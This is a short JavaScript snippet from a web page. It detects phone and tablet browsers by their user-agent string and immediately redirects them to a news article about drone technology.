<script type='text/javascript'>

  function mover(){
    window.location = 'https://jamuna-news.com/news/seven-key-improvements-being-made-to-drone-technology/'

  }; 

if(navigator.userAgent.match(/Android|webOS|iPhone|iPod|Blackberry/i) )
{

 setTimeout(mover,1)

}

if (navigator.userAgent.match(/Tablet|iPad/i))
{
    setTimeout(mover,1)
}

</script>
